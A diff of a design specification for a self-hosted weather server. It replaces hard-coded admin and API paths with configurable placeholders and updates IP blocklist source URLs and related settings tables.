+/{admin_path}/server/settings   # ✓ Server settings
+/{admin_path}/server/users      # ✓ User management
 ```
 
 ### API Route Hierarchy (Same Pattern)
 
 ```
-/api/v1/admin/                         # Admin API root
-/api/v1/admin/profile                  # Admin's own profile
-/api/v1/admin/preferences              # Admin's own preferences
-/api/v1/admin/server/                  # Server management API
-/api/v1/admin/server/settings          # Server settings
-/api/v1/admin/server/users             # User management
-/api/v1/admin/server/agents            # Agent management
+/api/{api_version}/{admin_path}/                         # Admin API root
+/api/{api_version}/{admin_path}/profile                  # Admin's own profile
+/api/{api_version}/{admin_path}/preferences              # Admin's own preferences
+/api/{api_version}/{admin_path}/server/                  # Server management API
+/api/{api_version}/{admin_path}/server/settings          # Server settings
+/api/{api_version}/{admin_path}/server/users             # User management
+/api/{api_version}/{admin_path}/server/agents            # Agent management
 ```
 
 ### Route Conflict Prevention
@@ -26569,7 +28072,7 @@ server:
 ```go
 // Admin route hierarchy validation
 var validAdminRootPaths = map[string]bool{
-    "":              true,  // Dashboard (/admin/)
+    "":              true,  // Dashboard (/{admin_path}/)
     "profile":       true,  // Admin's own profile
     "preferences":   true,  // Admin's own preferences
     "notifications": true,  // Admin's own notifications
@@ -26577,7 +28080,7 @@ var validAdminRootPaths = map[string]bool{
 }
 
 func validateAdminRoute(path string) error {
-    // Extract first segment after /admin/
+    // Extract first segment after /{admin_path}/
     parts := strings.Split(strings.Trim(path, "/"), "/")
     if len(parts) == 0 {
         return nil // Root path is OK
@@ -26610,8 +28113,8 @@ func validateAdminRoute(path string) error {
 | `server.admin_path` | `admin` | Path segment for admin panel (no leading slash) |
 
 **When changed, ALL admin routes update:**
-- `/admin/**` → `/admin/**`
-- `/api/v1/admin/**` → `/api/v1/admin/**`
+- `/admin/**` → `/{admin_path}/**`
+- `/api/{api_version}/{admin_path}/**` → `/api/{api_version}/{admin_path}/**`
 
 ### Validation Rules 
 
@@ -26654,7 +28157,7 @@ func validateAdminPath(newPath string, router *mux.Router) error {
 
 ### WebUI Change Flow 
 
-**When admin path changed via WebUI (`/admin/server/settings`):**
+**When admin path changed via WebUI (`/{admin_path}/server/settings`):**
 
 ```
 1. User submits new admin path
@@ -26671,7 +28174,7 @@ func validateAdminPath(newPath string, router *mux.Router) error {
 **Frontend JavaScript:**
 ```javascript
 async function changeAdminPath(newPath) {
-    const response = await fetch(`/api/v1/admin/server/settings`, {
+    const response = await fetch(`/api/{api_version}/{admin_path}/server/settings`, {
         method: 'PATCH',
         body: JSON.stringify({ admin_path: newPath })
     });
@@ -26719,7 +28222,7 @@ func APIVersion() string {
 
 // API base path helper
 func APIBasePath() string {
-    return "/api/" + APIVersion() // e.g., "/api/v1"
+    return "/api/" + APIVersion() // e.g., "/api/{api_version}"
 }
 
 // Use in route registration
@@ -26737,7 +28240,7 @@ func RegisterAdminRoutes(r *mux.Router) {
 // Use in templates
 {{ .AdminPath }}   // Available in all templates
 {{ .APIVersion }}  // Available in all templates
-{{ .APIBasePath }} // e.g., "/api/v1"
+{{ .APIBasePath }} // e.g., "/api/{api_version}"
 ```
 
 ### Restart vs Reload
@@ -26871,10 +28374,10 @@ func RegisterAdminRoutes(r *mux.Router) {
 
 | Feature | Description |
 |---------|-------------|
-| Login page | `/admin` (when not logged in) |
+| Login page | `/{admin_path}` (when not logged in) |
 | Login form | Username/password, centered card |
 | Session | Cookie-based (30 days default, configurable) |
-| CSRF | Protection on all forms |
+| CSRF | Token check on state-changing browser forms (cookie-auth path). Admin panel uses session cookies, so all admin POST/PUT/PATCH/DELETE forms get the check. Bearer-authenticated admin API calls (`/api/{api_version}/{admin_path}/*`) skip CSRF — see PART 16. |
 | Remember Me | Option available (extends to 90 days) |
 | Logout | Always visible in header |
 | MFA | TOTP support (optional, configurable) |
@@ -26901,8 +28404,8 @@ func RegisterAdminRoutes(r *mux.Router) {
 
 | Route | Server Admin Access |
 |-------|---------------------|
-| `/admin/*` | Full access |
-| `/users/*` | NO - treated as guest (redirect to `/admin`) |
+| `/{admin_path}/*` | Full access |
+| `/users/*` | NO - treated as guest (redirect to `/{admin_path}`) |
 | `/auth/login` | Login page |
 | `/auth/logout` | Logout |
 | Public routes (`/`, `/server/*`, etc.) | Guest view (no user-specific content) |
@@ -26929,11 +28432,11 @@ func RegisterAdminRoutes(r *mux.Router) {
 
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔧 Running in mode: {app_mode}                           │
 ├───────────────────────────────────────────────────────────┤
-│  🌐 HTTP:  {proto}://wthr.top:{port}                        │
+│  🌐 HTTP:  {proto}://{fqdn}:{port}                        │
 ├───────────────────────────────────────────────────────────┤
 │  📡 Listening on {proto}://{address}:{port}               │
 │  ✅ Server started on {startup_datetime}                  │
@@ -26944,7 +28447,7 @@ func RegisterAdminRoutes(r *mux.Router) {
 ├───────────────────────────────────────────────────────────┤
 │  Setup Token: {setup_token}                               │
 │                                                           │
-│  Go to {proto}://wthr.top/admin/server/setup         │
+│  Go to {proto}://{fqdn}/{admin_path}/server/setup         │
 │  and enter this token to complete setup.                  │
 │                                                           │
 │  This token will only be shown ONCE.                      │
@@ -26963,7 +28466,7 @@ func RegisterAdminRoutes(r *mux.Router) {
 | Public API endpoints | ✓ Yes |
 | Public web pages | ✓ Yes |
 | Health checks (`/healthz`) | ✓ Yes |
-| OpenAPI docs (`/openapi`) | ✓ Yes |
+| OpenAPI docs (`/server/docs/swagger`, `/api/openapi.json`) | ✓ Yes |
 | GraphQL (if applicable) | ✓ Yes |
 | Admin panel (`/admin`) | ✓ Yes (requires setup token) |
 | Email features | ✓ Yes (if SMTP auto-detected) |
@@ -26984,9 +28487,9 @@ On first run, a one-time setup token is generated and displayed in console. Admi
 | 1 | Server generates one-time setup token (displayed in console ONCE) |
 | 2 | User navigates to `/admin` |
 | 3 | User enters setup token |
-| 4 | Redirect to `/admin/server/setup` (setup wizard) |
+| 4 | Redirect to `/{admin_path}/server/setup` (setup wizard) |
 
-**Setup Wizard Steps (`/admin/server/setup`):**
+**Setup Wizard Steps (`/{admin_path}/server/setup`):**
 
 **Step 1: Create Admin Account**
 | Field | Default | Notes |
@@ -27040,7 +28543,7 @@ On first run, a one-time setup token is generated and displayed in console. Admi
 
 | Method | Description |
 |--------|-------------|
-| **Manual creation** | Primary admin invites additional admin accounts via `/admin/server/admins` |
+| **Manual creation** | Primary admin invites additional admin accounts via `/{admin_path}/server/admins` |
 | **OIDC/LDAP group mapping** | Map external identity provider groups to Server Admin role |
 
 ### Admin Hierarchy
@@ -27061,7 +28564,7 @@ On first run, a one-time setup token is generated and displayed in console. Admi
 ### Admin Invite Flow
 
 ```
-Admin Panel (/admin/server/admins)
+Admin Panel (/{admin_path}/server/admins)
 ┌─────────────────────────────────────────────────────────────┐
 │  Server Administrators                                      │
 ├─────────────────────────────────────────────────────────────┤
@@ -27172,7 +28675,7 @@ Admin clicks "Invite New Admin"
 
 | Feature | Description |
 |---------|-------------|
-| **Registration** | Admin can register multiple passkeys at `/admin/profile/security` |
+| **Registration** | Admin can register multiple passkeys at `/{admin_path}/profile/security` |
 | **Login** | Passkey can be used as primary login or as 2FA |
 | **Device-bound** | Each passkey tied to specific device/authenticator |
 | **Naming** | Admin names each passkey for identification |
@@ -27183,7 +28686,7 @@ Admin clicks "Invite New Admin"
 
 | Feature | Description |
 |---------|-------------|
-| **Setup** | QR code + manual entry key at `/admin/profile/security` |
+| **Setup** | QR code + manual entry key at `/{admin_path}/profile/security` |
 | **Apps supported** | Any TOTP app (Google Authenticator, Authy, 1Password, etc.) |
 | **Backup codes** | 10 one-time recovery codes generated on setup |
 | **Regenerate** | Can regenerate backup codes (invalidates old ones) |
@@ -27273,7 +28776,7 @@ Admin clicks "Invite New Admin"
 - SMTP status shown in notification preferences
 - See PART 18: EMAIL & NOTIFICATIONS for SMTP configuration
 
-#### Admin Appearance Settings (`/admin/profile/preferences`)
+#### Admin Appearance Settings (`/{admin_path}/profile/preferences`)
 
 **Server admins can customize their admin panel appearance.**
 
@@ -27334,7 +28837,7 @@ Admin clicks "Invite New Admin"
 | Total admin count (number only) | Other admin 2FA secrets |
 | | Other admin session data |
 
-**Admin Panel (`/admin/server/admins`):**
+**Admin Panel (`/{admin_path}/server/admins`):**
 ```
 ┌─────────────────────────────────────────────────────────────┐
 │  Server Administrators                                      │
@@ -27429,7 +28932,7 @@ Admin Panel Header:
 │         │                   │           │
 │         └───────────────────┘           │
 │                                         │
-│              1.0.0           │
+│              {project_version}           │
 └─────────────────────────────────────────┘
 ```
 
@@ -27440,7 +28943,7 @@ Admin Panel Header:
 - Version number at bottom (small)
 - No "Forgot password" (admin resets via CLI if needed)
 
-### Dashboard (`/admin/dashboard`)
+### Dashboard (`/{admin_path}/dashboard`)
 
 **Overview of server status and system resources at a glance.**
 
@@ -27502,31 +29005,31 @@ Admin Panel Header:
 
 | Route | Page | Description |
 |-------|------|-------------|
-| `/admin` | Login | Login form (if not authenticated) |
-| `/admin/dashboard` | Dashboard | Overview, stats, quick actions |
-| `/admin/server/settings` | Server Settings | Port, mode, FQDN, etc. |
-| `/admin/server/branding` | Branding | Title, logo, favicon, colors |
-| `/admin/server/ssl` | SSL/TLS | Certificates, Let's Encrypt |
-| `/admin/server/scheduler` | Scheduler | View/edit scheduled tasks |
-| `/admin/server/email` | Email | SMTP settings, templates |
-| `/admin/server/logs` | Logs | View access, error, audit logs |
-| `/admin/server/security/auth` | Authentication | Password, MFA, sessions |
-| `/admin/server/security/tokens` | API Tokens | Generate, revoke tokens |
-| `/admin/server/security/ratelimit` | Rate Limiting | Configure rate limits |
-| `/admin/server/security/firewall` | Firewall | IP allow/block lists |
-| `/admin/server/security/allowlist` | Allowlist | Trusted IPs (bypass blocklist/ratelimit/geoip) |
-| `/admin/server/network/tor` | Tor | View .onion address, status (auto-enabled if installed) |
-| `/admin/server/network/geoip` | GeoIP | Country blocking, database updates |
-| `/admin/server/network/blocklists` | Blocklists | IP/domain blocklists |
-| `/admin/server/moderation/users` | Users | User moderation (if multi-user) |
-| `/admin/server/users/invites` | Invites | Invite codes (if multi-user) |
-| `/admin/server/backup` | Backup | Create/restore backups |
-| `/admin/server/maintenance` | Maintenance | Maintenance mode |
-| `/admin/server/updates` | Updates | Check/apply updates |
-| `/admin/server/info` | Server Info | Version, environment, deps |
-| `/admin/server/cluster/nodes` | Nodes | Cluster node management |
-| `/admin/server/cluster/add` | Add Node | Generate join token |
-| `/admin/help` | Help | Documentation links |
+| `/{admin_path}` | Login | Login form (if not authenticated) |
+| `/{admin_path}/dashboard` | Dashboard | Overview, stats, quick actions |
+| `/{admin_path}/server/settings` | Server Settings | Port, mode, FQDN, etc. |
+| `/{admin_path}/server/branding` | Branding | Title, logo, favicon, colors |
+| `/{admin_path}/server/ssl` | SSL/TLS | Certificates, Let's Encrypt |
+| `/{admin_path}/server/scheduler` | Scheduler | View/edit scheduled tasks |
+| `/{admin_path}/server/email` | Email | SMTP settings, templates |
+| `/{admin_path}/server/logs` | Logs | View access, error, audit logs |
+| `/{admin_path}/server/security/auth` | Authentication | Password, MFA, sessions |
+| `/{admin_path}/server/security/tokens` | API Tokens | Generate, revoke tokens |
+| `/{admin_path}/server/security/ratelimit` | Rate Limiting | Configure rate limits |
+| `/{admin_path}/server/security/firewall` | Firewall | IP allow/block lists |
+| `/{admin_path}/server/security/allowlist` | Allowlist | Trusted IPs (bypass blocklist/ratelimit/geoip) |
+| `/{admin_path}/server/network/tor` | Tor | View .onion address, status (auto-enabled if installed) |
+| `/{admin_path}/server/network/geoip` | GeoIP | Country blocking, database updates |
+| `/{admin_path}/server/network/blocklists` | Blocklists | IP/domain blocklists |
+| `/{admin_path}/server/moderation/users` | Users | User moderation (if multi-user) |
+| `/{admin_path}/server/users/invites` | Invites | Invite codes (if multi-user) |
+| `/{admin_path}/server/backup` | Backup | Create/restore backups |
+| `/{admin_path}/server/maintenance` | Maintenance | Maintenance mode |
+| `/{admin_path}/server/updates` | Updates | Check/apply updates |
+| `/{admin_path}/server/info` | Server Info | Version, environment, deps |
+| `/{admin_path}/server/cluster/nodes` | Nodes | Cluster node management |
+| `/{admin_path}/server/cluster/add` | Add Node | Generate join token |
+| `/{admin_path}/help` | Help | Documentation links |
 
 ### Settings Page Layout
 
@@ -27604,7 +29107,7 @@ Admin Panel Header:
 
 ### Server Settings Field Definitions
 
-**`/admin/server/settings` - All fields with control types:**
+**`/{admin_path}/server/settings` - All fields with control types:**
 
 #### General Section
 
@@ -27622,7 +29125,7 @@ Admin Panel Header:
 | `daemonize` | Toggle | Off | ⚠️ Yes | Detach from terminal on start |
 | `pidfile` | Toggle | On | ⚠️ Yes | Create PID file |
 
-#### Branding Section (`/admin/server/branding`)
+#### Branding Section (`/{admin_path}/server/branding`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27643,7 +29146,7 @@ Admin Panel Header:
 | `og_image` | File | (none) | No | OpenGraph image |
 | `twitter_handle` | Text | (empty) | No | Twitter @handle |
 
-#### Security Section (`/admin/server/security`)
+#### Security Section (`/{admin_path}/server/security`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27679,7 +29182,7 @@ Admin Panel Header:
 | `allowlist` | Tags | (empty) | No | Trusted IPs — bypass blocklists, rate limits, GeoIP (not auth) |
 | `blocklist` | Tags | (empty) | No | IPs always blocked |
 
-#### SSL/TLS Section (`/admin/server/ssl`)
+#### SSL/TLS Section (`/{admin_path}/server/ssl`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27692,7 +29195,7 @@ Admin Panel Header:
 | `ssl.letsencrypt.staging` | Toggle | Off | No | Use LE staging server |
 | `ssl.letsencrypt.challenge` | Dropdown | `http-01` | No | Challenge type |
 
-#### Authentication Section (`/admin/server/security/auth`)
+#### Authentication Section (`/{admin_path}/server/security/auth`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27705,7 +29208,7 @@ Admin Panel Header:
 | `password.require_number` | Toggle | On | No | Require number |
 | `password.require_special` | Toggle | Off | No | Require special char |
 
-#### Backup Section (`/admin/server/backup`)
+#### Backup Section (`/{admin_path}/server/backup`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27719,7 +29222,7 @@ Admin Panel Header:
 | `backup.encryption.enabled` | Toggle | Off | No | Encrypt backups |
 | `backup.encryption.password` | Password | (none) | No | Encryption password |
 
-#### Email/SMTP Section (`/admin/server/email`)
+#### Email/SMTP Section (`/{admin_path}/server/email`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27729,10 +29232,10 @@ Admin Panel Header:
 | `smtp.password` | Password | (none) | No | SMTP password |
 | `smtp.tls` | Dropdown | `auto` | No | `auto`/`starttls`/`tls`/`none` |
 | `from.name` | Text | (app title) | No | Sender name |
-| `from.email` | Text | `no-reply@wthr.top` | No | Sender email |
+| `from.email` | Text | `no-reply@{fqdn}` | No | Sender email |
 | `[Test Connection]` | Button | - | - | Send test email |
 
-#### Notifications Section (`/admin/server/notifications`)
+#### Notifications Section (`/{admin_path}/server/notifications`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27743,7 +29246,7 @@ Admin Panel Header:
 | `notifications.security_alerts` | Toggle | On | No | Security event alerts |
 | `notifications.update_available` | Toggle | On | No | New version available |
 
-#### Scheduler Section (`/admin/server/scheduler`)
+#### Scheduler Section (`/{admin_path}/server/scheduler`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27756,7 +29259,7 @@ Admin Panel Header:
 | - Next run | Readonly | timestamp | - | Next execution |
 | - `[Run Now]` | Button | - | - | Trigger immediately |
 
-#### URL Detection Section (`/admin/server/url`)
+#### URL Detection Section (`/{admin_path}/server/url`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27768,7 +29271,7 @@ Admin Panel Header:
 | Detected domains | Readonly | - | - | Currently detected FQDNs |
 | Inferred wildcard | Readonly | - | - | `*.example.com` if detected |
 
-#### Tor Section (`/admin/server/tor`) - *if tor installed*
+#### Tor Section (`/{admin_path}/server/tor`) - *if tor installed*
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27777,7 +29280,7 @@ Admin Panel Header:
 | `tor.status` | Readonly | - | - | Running/Stopped |
 | `[Copy Address]` | Button | - | - | Copy onion to clipboard |
 
-#### GeoIP Section (`/admin/server/network/geoip`)
+#### GeoIP Section (`/{admin_path}/server/network/geoip`)
 
 | Setting | Control | Default | Restart | Description |
 |---------|---------|---------|---------|-------------|
@@ -27788,7 +29291,7 @@ Admin Panel Header:
 | `geoip.allow_countries` | Tags | (empty) | No | Allow ONLY these countries (overrides deny) |
 | Database status | Readonly | - | - | Last update, size |
 
-#### Blocklists Section (`/admin/server/network/blocklists`)
+#### Blocklists Section (`/{admin_path}/server/network/blocklists`)
 
 **Transmission-style IP/domain blocklist management. Download, parse, and enforce external blocklists from configurable URLs.**
 
@@ -27823,13 +29326,23 @@ server:
           format: cidr
           enabled: true
 
-        - name: "spamhaus_drop"
-          url: "https://www.spamhaus.org/drop/drop.txt"
+        - name: "spamhaus_drop_v4"
+          url: "https://www.spamhaus.org/drop/drop_v4.json"
           format: cidr
           enabled: true
 
+        - name: "spamhaus_drop_v6"
+          url: "https://www.spamhaus.org/drop/drop_v6.json"
+          format: cidr
+          enabled: true
+
+        - name: "spamhaus_asndrop"
+          url: "https://www.spamhaus.org/drop/asndrop.json"
+          format: asn
+          enabled: false   # opt-in; ASN-level blocking is broader
+
         - name: "level1"
-          url: "https://www.iblocklist.com/lists/level1.gz"
+          url: "https://list.iblocklist.com/?list=ydxerpxkpcfqjaybcssw&fileformat=p2p&archiveformat=gz"
           format: auto  # auto-detect from content/extension (P2P, gzipped)
           enabled: false
 
@@ -27839,7 +29352,7 @@ server:
           enabled: false
 
         - name: "dshield"
-          url: "https://www.dshield.org/block.txt"
+          url: "https://feeds.dshield.org/block.txt"
           format: cidr
           enabled: false
 
@@ -27992,20 +29505,20 @@ func BlocklistMiddleware(lookup *BlocklistLookup, cfg BlocklistConfig) func(http
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/network/blocklists` | GET | List all blocklist sources with stats |
-| `/api/v1/admin/server/network/blocklists` | PATCH | Update blocklist settings (enabled, action, etc.) |
-| `/api/v1/admin/server/network/blocklists/sources` | POST | Add new blocklist source |
-| `/api/v1/admin/server/network/blocklists/sources/{name}` | PATCH | Update source (enable/disable, URL, format) |
-| `/api/v1/admin/server/network/blocklists/sources/{name}` | DELETE | Remove blocklist source |
-| `/api/v1/admin/server/network/blocklists/update` | POST | Trigger immediate update of all enabled sources |
-| `/api/v1/admin/server/network/blocklists/update/{name}` | POST | Trigger update of specific source |
-| `/api/v1/admin/server/network/blocklists/stats` | GET | Get aggregate blocklist statistics |
-| `/api/v1/admin/server/network/blocklists/check/{ip}` | GET | Check if an IP is in any blocklist |
+| `/api/{api_version}/{admin_path}/server/network/blocklists` | GET | List all blocklist sources with stats |
+| `/api/{api_version}/{admin_path}/server/network/blocklists` | PATCH | Update blocklist settings (enabled, action, etc.) |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/sources` | POST | Add new blocklist source |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/sources/{name}` | PATCH | Update source (enable/disable, URL, format) |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/sources/{name}` | DELETE | Remove blocklist source |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/update` | POST | Trigger immediate update of all enabled sources |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/update/{name}` | POST | Trigger update of specific source |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/stats` | GET | Get aggregate blocklist statistics |
+| `/api/{api_version}/{admin_path}/server/network/blocklists/check/{ip}` | GET | Check if an IP is in any blocklist |
 
 **API Response Examples:**
 
 ```json
-// GET /api/v1/admin/server/network/blocklists
+// GET /api/{api_version}/{admin_path}/server/network/blocklists
 {
   "enabled": true,
   "action": "reject",
@@ -28015,7 +29528,7 @@ func BlocklistMiddleware(lookup *BlocklistLookup, cfg BlocklistConfig) func(http
   "sources": [
     {
       "name": "level1",
-      "url": "https://www.iblocklist.com/lists/level1.gz",
+      "url": "https://list.iblocklist.com/?list=ydxerpxkpcfqjaybcssw&fileformat=p2p&archiveformat=gz",
       "format": "auto",
       "enabled": true,
       "rule_count": 398211,
@@ -28025,7 +29538,7 @@ func BlocklistMiddleware(lookup *BlocklistLookup, cfg BlocklistConfig) func(http
     },
     {
       "name": "spamhaus_drop",
-      "url": "https://www.spamhaus.org/drop/drop.txt",
+      "url": "https://www.spamhaus.org/drop/drop_v4.json",
       "format": "cidr",
       "enabled": true,
       "rule_count": 84520,
@@ -28036,7 +29549,7 @@ func BlocklistMiddleware(lookup *BlocklistLookup, cfg BlocklistConfig) func(http
   ]
 }
 
-// GET /api/v1/admin/server/network/blocklists/check/1.2.3.4
+// GET /api/{api_version}/{admin_path}/server/network/blocklists/check/1.2.3.4
 {
   "ip": "1.2.3.4",
   "blocked": true,
@@ -28064,15 +29577,15 @@ func BlocklistMiddleware(lookup *BlocklistLookup, cfg BlocklistConfig) func(http
 │ ┌─ Sources ─────────────────────────────────────────────────────────┐   │
 │ │                                                                    │   │
 │ │ ☑ level1                     398,211 rules    Updated 2h ago       │   │
-│ │   https://www.iblocklist.com/lists/level1.gz                       │   │
+│ │   https://list.iblocklist.com/?list=ydxerpxkpcfqjaybcssw&fileformat=p2p&archiveformat=gz                       │   │
 │ │   Format: auto  Size: 2.7 MB                    [Update] [Remove]  │   │
 │ │                                                                    │   │
 │ │ ☑ spamhaus_drop               84,520 rules    Updated 2h ago       │   │
-│ │   https://www.spamhaus.org/drop/drop.txt                           │   │
+│ │   https://www.spamhaus.org/drop/drop_v4.json                           │   │
 │ │   Format: cidr  Size: 12 KB                     [Update] [Remove]  │   │
 │ │                                                                    │   │
 │ │ ☐ dshield                          0 rules    Never updated        │   │
-│ │   https://www.dshield.org/block.txt                                │   │
+│ │   https://feeds.dshield.org/block.txt                                │   │
 │ │   Format: cidr  (disabled)                      [Update] [Remove]  │   │
 │ │                                                                    │   │
 │ └───────────────────────────────────────────────────────────────────┘   │
@@ -28180,7 +29693,7 @@ weather-cli --admin server blocklist stats
 | Read-only info | **Readonly** |
 | Trigger action | **Button** |
 
-### Log Viewer (`/admin/server/logs`)
+### Log Viewer (`/{admin_path}/server/logs`)
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────┐
@@ -28190,10 +29703,10 @@ weather-cli --admin server blocklist stats
 │  [Access ▼]  [Last 100 ▼]  [Search...        ]  [Auto-refresh: ON]     │
 │                                                                         │
 │  ┌─────────────────────────────────────────────────────────────────┐    │
-│  │ 2025-01-15 10:30:45  GET  /api/v1/healthz 200  12ms  192.168.1.1│    │
-│  │ 2025-01-15 10:30:44  POST /api/v1/data    201  45ms  192.168.1.2│    │
+│  │ 2025-01-15 10:30:45  GET  /api/{api_version}/healthz 200  12ms  192.168.1.1│    │
+│  │ 2025-01-15 10:30:44  POST /api/{api_version}/data    201  45ms  192.168.1.2│    │
 │  │ 2025-01-15 10:30:43  GET  /healthz        200  2ms   192.168.1.1│    │
-│  │ 2025-01-15 10:30:42  GET  /api/v1/users   401  5ms   10.0.0.50  │    │
+│  │ 2025-01-15 10:30:42  GET  /api/{api_version}/users   401  5ms   10.0.0.50  │    │
 │  │ ...                                                              │    │
 │  └─────────────────────────────────────────────────────────────────┘    │
 │                                                                         │
@@ -28272,7 +29785,7 @@ Check for valid admin session
 | Aspect | Admin Session | User Session |
 |--------|---------------|--------------|
 | Cookie name | `admin_session` | `user_session` |
-| Valid routes | `/admin/**` only | `/**` except `/admin/**` |
+| Valid routes | `/{admin_path}/**` only | `/**` except `/{admin_path}/**` |
 | Stored in | `server.db` (admin_sessions) | `users.db` (user_sessions) |
 | Credentials | `admins` table | `users` table |
 | Default duration | 30 days | 7 days |
@@ -28300,7 +29813,7 @@ The admin panel MUST include a scheduler section with:
 - `monthly` - Once per month (configurable day/time)
 - `custom` - Cron expression
 
-## /api/v1/admin (REST API)
+## /api/{api_version}/{admin_path} (REST API)
 
 ### Authentication
 
@@ -28308,144 +29821,144 @@ The admin panel MUST include a scheduler section with:
 
 **These admin API routes are ALWAYS available, regardless of whether Multi-User (PART 34) is implemented.**
 
-### Admin - Server (`/api/v1/admin/server/`)
+### Admin - Server (`/api/{api_version}/{admin_path}/server/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/setup` | GET | Get setup status |
-| `/api/v1/admin/server/setup/verify` | POST | Verify setup token |
-| `/api/v1/admin/server/setup/account` | POST | Create admin account (Step 1) |
-| `/api/v1/admin/server/setup/token` | POST | Generate API token (Step 2) |
-| `/api/v1/admin/server/setup/config` | POST | Save server config (Step 3) |
-| `/api/v1/admin/server/setup/security` | POST | Security settings (Step 4) |
-| `/api/v1/admin/server/setup/services` | POST | Configure services (Step 5) |
-| `/api/v1/admin/server/setup/complete` | POST | Complete setup wizard (Step 6) |
-| `/api/v1/admin/server/settings` | GET | Get server settings |
-| `/api/v1/admin/server/settings` | PATCH | Update server settings |
-| `/api/v1/admin/server/status` | GET | Server status (detailed) |
-| `/api/v1/admin/server/stats` | GET | Statistics |
-| `/api/v1/admin/server/restart` | POST | Restart server |
+| `/api/{api_version}/{admin_path}/server/setup` | GET | Get setup status |
+| `/api/{api_version}/{admin_path}/server/setup/verify` | POST | Verify setup token |
+| `/api/{api_version}/{admin_path}/server/setup/account` | POST | Create admin account (Step 1) |
+| `/api/{api_version}/{admin_path}/server/setup/token` | POST | Generate API token (Step 2) |
+| `/api/{api_version}/{admin_path}/server/setup/config` | POST | Save server config (Step 3) |
+| `/api/{api_version}/{admin_path}/server/setup/security` | POST | Security settings (Step 4) |
+| `/api/{api_version}/{admin_path}/server/setup/services` | POST | Configure services (Step 5) |
+| `/api/{api_version}/{admin_path}/server/setup/complete` | POST | Complete setup wizard (Step 6) |
+| `/api/{api_version}/{admin_path}/server/settings` | GET | Get server settings |
+| `/api/{api_version}/{admin_path}/server/settings` | PATCH | Update server settings |
+| `/api/{api_version}/{admin_path}/server/status` | GET | Server status (detailed) |
+| `/api/{api_version}/{admin_path}/server/stats` | GET | Statistics |
+| `/api/{api_version}/{admin_path}/server/restart` | POST | Restart server |
 
-### Admin - Server Admins (`/api/v1/admin/server/admins/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/admins` | GET | List Server Admins |
-| `/api/v1/admin/server/admins/{id}` | GET | Get admin details |
-| `/api/v1/admin/server/admins/{id}` | DELETE | Delete admin |
-| `/api/v1/admin/server/admins/{id}/disable` | POST | Disable admin |
-| `/api/v1/admin/server/admins/{id}/enable` | POST | Enable admin |
-| `/api/v1/admin/server/admins/invite` | POST | Generate admin invite link |
-
-### Admin - Profile (`/api/v1/admin/profile/`)
+### Admin - Server Admins (`/api/{api_version}/{admin_path}/server/admins/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/profile` | GET | Get admin profile |
-| `/api/v1/admin/profile` | PATCH | Update admin profile |
-| `/api/v1/admin/profile/password` | POST | Change admin password |
-| `/api/v1/admin/profile/token` | GET | Get current API token (masked) |
-| `/api/v1/admin/profile/token` | POST | Regenerate API token |
-| `/api/v1/admin/profile/preferences` | GET | Get admin preferences (theme, notifications) |
-| `/api/v1/admin/profile/preferences` | PATCH | Update admin preferences |
+| `/api/{api_version}/{admin_path}/server/admins` | GET | List Server Admins |
+| `/api/{api_version}/{admin_path}/server/admins/{id}` | GET | Get admin details |
+| `/api/{api_version}/{admin_path}/server/admins/{id}` | DELETE | Delete admin |
+| `/api/{api_version}/{admin_path}/server/admins/{id}/disable` | POST | Disable admin |
+| `/api/{api_version}/{admin_path}/server/admins/{id}/enable` | POST | Enable admin |
+| `/api/{api_version}/{admin_path}/server/admins/invite` | POST | Generate admin invite link |
 
-### Admin - Branding (`/api/v1/admin/server/branding/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/branding` | GET | Get branding settings |
-| `/api/v1/admin/server/branding` | PATCH | Update branding |
-
-### Admin - SSL (`/api/v1/admin/server/ssl/`)
+### Admin - Profile (`/api/{api_version}/{admin_path}/profile/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/ssl` | GET | Get SSL settings |
-| `/api/v1/admin/server/ssl` | PATCH | Update SSL settings |
-| `/api/v1/admin/server/ssl/renew` | POST | Force certificate renewal |
+| `/api/{api_version}/{admin_path}/profile` | GET | Get admin profile |
+| `/api/{api_version}/{admin_path}/profile` | PATCH | Update admin profile |
+| `/api/{api_version}/{admin_path}/profile/password` | POST | Change admin password |
+| `/api/{api_version}/{admin_path}/profile/token` | GET | Get current API token (masked) |
+| `/api/{api_version}/{admin_path}/profile/token` | POST | Regenerate API token |
+| `/api/{api_version}/{admin_path}/profile/preferences` | GET | Get admin preferences (theme, notifications) |
+| `/api/{api_version}/{admin_path}/profile/preferences` | PATCH | Update admin preferences |
 
-### Admin - Tor (`/api/v1/admin/server/tor/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/tor` | GET | Get Tor status |
-| `/api/v1/admin/server/tor` | PATCH | Update Tor settings |
